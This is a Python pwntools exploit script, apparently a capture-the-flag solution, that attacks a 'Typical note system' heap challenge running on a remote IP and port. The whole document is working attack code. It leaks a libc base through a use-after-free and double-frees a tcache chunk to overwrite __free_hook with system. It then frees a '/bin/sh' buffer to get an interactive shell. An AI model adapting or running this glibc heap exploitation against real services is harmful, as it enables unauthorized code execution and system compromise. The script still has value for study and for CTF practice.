from __future__ import division, print_function
import random
from pwn import *

log = False
is_gaibu = True
if is_gaibu:
    host = "35.200.22.128"
    port = 34000
else:
    host = "127.0.0.1"
    port = 3001

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

def send_choice(c):
    recvuntil('> ')
    sendline(str(c))

def send_index(index):
    sendline(str(index))

def malloc(index, size, s):
    send_choice(0)
    send_index(index)
    sendline(str(size))
    sendline(s)

def free(index):
    send_choice(1)
    send_index(index)

def show(index):
    send_choice(2)
    send_index(index)
    s = recvuntil('Done.');
    return s.replace('Done.', '')

recvuntil('Hello. Typical note system.\n')
malloc(0, 4000, 'hoge')
malloc(1, 40, 'hoge')
malloc(2, 40, '/bin/sh\x00')
free(0)
libc_base = just_u64(show(0).strip('\n')) - 0x3ebca0
print('libc_base: ', hex(libc_base))
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f440
free(1)
free(1)
wait_for_attach()
malloc(1, 40, p64(free_hook))
malloc(1, 40, 'A')
malloc(1, 40, p64(system))
free(2)

interactive()
